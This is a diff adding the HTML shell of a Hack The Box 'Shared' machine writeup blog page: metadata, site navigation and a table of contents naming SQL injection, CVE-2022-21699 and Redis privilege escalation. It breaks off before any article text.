@@ -1,0 +1,1457 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="false"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Shared Writeup &middot; Mil4ne&#39;s Blog</title>
+  <meta name="title" content="Shared Writeup &middot; Mil4ne&#39;s Blog" />
+  
+  <meta name="description" content="My awesome website" />
+  <meta name="keywords" content="medium, " />
+  
+  
+  <link rel="canonical" href="https://your_domain.com/writeups/8.-shared/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.ac59a1b8eaafef739c129d12787ac29f6a420bcb348c7aeec8949a8d0b7d6c2023766c169d14b9031b751504eb3c976efe786fec135b340a49868acd8caa4127.css"
+    integrity="sha512-rFmhuOqv73OcEp0SeHrCn2pCC8s0jHruyJSajQt9bCAjdmwWnRS5Axt1FQTrPJdu/nhv7BNbNApJhorNjKpBJw==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.b36dda9ec4ec11e967fd341e7d57b8c484ac7a39f8f329f7bcf7ce4812569de8607db866a086d4789956ac0b74967e251c9a566d94d469dd28b8787fed4f46f5.js"
+    integrity="sha512-s23ansTsEeln/TQefVe4xISsejn48yn3vPfOSBJWnehgfbhmoIbUeJlWrAt0ln4lHJpWbZTUad0ouHh/7U9G9Q==" data-copy="" data-copied=""></script>
+  
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="https://your_domain.com/writeups/8.-shared/">
+  <meta property="og:site_name" content="Mil4ne&#39;s Blog">
+  <meta property="og:title" content="Shared Writeup">
+  <meta property="og:description" content="Shared is a medium Linux machine created by Nauten on Hack The Box that features a website with a virtual hostname that is vulnerable to SQL injection.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2022-01-25T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-01-25T00:00:00+00:00">
+    <meta property="article:tag" content="Medium">
+    <meta property="og:image" content="https://your_domain.com/writeups/8.-shared/featured.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://your_domain.com/writeups/8.-shared/featured.png">
+  <meta name="twitter:title" content="Shared Writeup">
+  <meta name="twitter:description" content="Shared is a medium Linux machine created by Nauten on Hack The Box that features a website with a virtual hostname that is vulnerable to SQL injection.">
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Hackthebox Writeups",
+    "name": "Shared Writeup",
+    "headline": "Shared Writeup",
+    
+    "abstract": "Shared is a medium Linux machine created by Nauten on Hack The Box that features a website with a virtual hostname that is vulnerable to SQL injection.",
+    "inLanguage": "en",
+    "url" : "https:\/\/your_domain.com\/writeups\/8.-shared\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Mil4ne"
+    },
+    "copyrightYear": "2022",
+    "dateCreated": "2022-01-25T00:00:00\u002b00:00",
+    "datePublished": "2022-01-25T00:00:00\u002b00:00",
+    
+    "dateModified": "2022-01-25T00:00:00\u002b00:00",
+    
+    "keywords": ["medium"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1882"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="Mil4ne" />
+  
+  
+  
+  <link href="https://github.com/mil4ne" rel="me" />
+  
+  
+  <link href="https://linkedin.com/in/mil4ne" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Mil4ne&rsquo;s Blog</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+             
+  <div>
+  <div class="cursor-pointer flex items-center nested-menu">
+    
+    <a  href="/posts/"   class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
+      Articles
+    </a>
+    <span>
+      
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+    </span>
+  </div>
+  <div class="absolute menuhide">
+    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
+      <div class="flex flex-col space-y-3">
+        
+        <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            Linux Privilege Escalation
+          </p>
+        </a>
+        
+        <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            Web Hacking
+          </p>
+        </a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+            
+             
+  <div>
+  <div class="cursor-pointer flex items-center nested-menu">
+    
+    <a  href="/writeups/"   class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
+      HTB Writeups
+    </a>
+    <span>
+      
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+    </span>
+  </div>
+  <div class="absolute menuhide">
+    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
+      <div class="flex flex-col space-y-3">
+        
+        <a href="/tags/easy/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            Easy Machines
+          </p>
+        </a>
+        
+        <a href="/tags/medium/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            Medium Machines
+          </p>
+        </a>
+        
+        <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            Hard Machines
+          </p>
+        </a>
+        
+        <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            Insane Machines
+          </p>
+        </a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+            
+             
+  <div>
+  <div class="cursor-pointer flex items-center nested-menu">
+    
+    <a  class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
+      Projects
+    </a>
+    <span>
+      
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+    </span>
+  </div>
+  <div class="absolute menuhide">
+    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
+      <div class="flex flex-col space-y-3">
+        
+        <a href="/exploitdev/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            Exploit Development
+          </p>
+        </a>
+        
+        <a href="/webdev/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            Web Development
+          </p>
+        </a>
+        
+        <a href="/toolsdev/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            Tools Development
+          </p>
+        </a>
+        
+        <a href="/malwdev/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            Malware Development
+          </p>
+        </a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+            
+            
+  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        About
+    </p>
+</a>
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                     
+  <li class="mt-1">
+    <a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Articles
+        </p>
+        <span>
+            
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+        </span>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            Linux Privilege Escalation
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            Web Hacking
+        </p>
+    </a>
+</li>
+
+<li class="mb-2"></li>
+
+
+
+                    
+
+                     
+  <li class="mt-1">
+    <a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            HTB Writeups
+        </p>
+        <span>
+            
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+        </span>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/tags/easy/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            Easy Machines
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/tags/medium/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            Medium Machines
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            Hard Machines
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            Insane Machines
+        </p>
+    </a>
+</li>
+
+<li class="mb-2"></li>
+
+
+
+                    
+
+                     
+  <li class="mt-1">
+    <a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Projects
+        </p>
+        <span>
+            
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+        </span>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/exploitdev/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            Exploit Development
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/webdev/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            Web Development
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/toolsdev/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            Tools Development
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/malwdev/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            Malware Development
+        </p>
+    </a>
+</li>
+
+<li class="mb-2"></li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            About
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      Shared Writeup
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2022-01-25 00:00:00 &#43;0000 UTC">25 January 2022</time>
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="Mil4ne" src="/img/banner3_hu41c424fd5e13fdf2a0b0b2c5ba96947d_74437_192x192_fill_box_center_3.png" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      Author
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      Mil4ne
+    </div>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">A little bit about you</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/mil4ne"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://linkedin.com/in/mil4ne"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
+
+         <details open class="toc-right mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#span-stylecolor-33acffinitial-reconspan"><span style="color: #33acff">Initial Recon</span></a></li>
+    <li><a href="#span-stylecolor-33acffweb-reconspan"><span style="color: #33acff">Web Recon</span></a>
+      <ul>
+        <li><a href="#walking-the-application">Walking the Application</a></li>
+        <li><a href="#investigating-functionality">Investigating Functionality</a></li>
+        <li><a href="#vulnerability-discovery">Vulnerability Discovery</a></li>
+      </ul>
+    </li>
+    <li><a href="#span-stylecolor-33acffweb-exploitationspan"><span style="color: #33acff">Web Exploitation</span></a>
+      <ul>
+        <li><a href="#union-query-exfiltration">Union Query Exfiltration</a></li>
+        <li><a href="#shell-as-james_mason">Shell as james_mason</a></li>
+        <li><a href="#lateral-movement">Lateral Movement</a></li>
+        <li><a href="#cve-2022-21699">CVE-2022-21699</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#span-stylecolor-33acffprivilege-escalation-span"><span style="color: #33acff">Privilege Escalation </span></a>
+      <ul>
+        <li><a href="#stabilizing-shell">Stabilizing Shell</a></li>
+        <li><a href="#redis">Redis</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#span-stylecolor-33acffinitial-reconspan"><span style="color: #33acff">Initial Recon</span></a></li>
+    <li><a href="#span-stylecolor-33acffweb-reconspan"><span style="color: #33acff">Web Recon</span></a>
+      <ul>
+        <li><a href="#walking-the-application">Walking the Application</a></li>
+        <li><a href="#investigating-functionality">Investigating Functionality</a></li>
+        <li><a href="#vulnerability-discovery">Vulnerability Discovery</a></li>
+      </ul>
+    </li>
+    <li><a href="#span-stylecolor-33acffweb-exploitationspan"><span style="color: #33acff">Web Exploitation</span></a>
+      <ul>
+        <li><a href="#union-query-exfiltration">Union Query Exfiltration</a></li>
+        <li><a href="#shell-as-james_mason">Shell as james_mason</a></li>
+        <li><a href="#lateral-movement">Lateral Movement</a></li>
+        <li><a href="#cve-2022-21699">CVE-2022-21699</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#span-stylecolor-33acffprivilege-escalation-span"><span style="color: #33acff">Privilege Escalation </span></a>
+      <ul>
+        <li><a href="#stabilizing-shell">Stabilizing Shell</a></li>
+        <li><a href="#redis">Redis</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
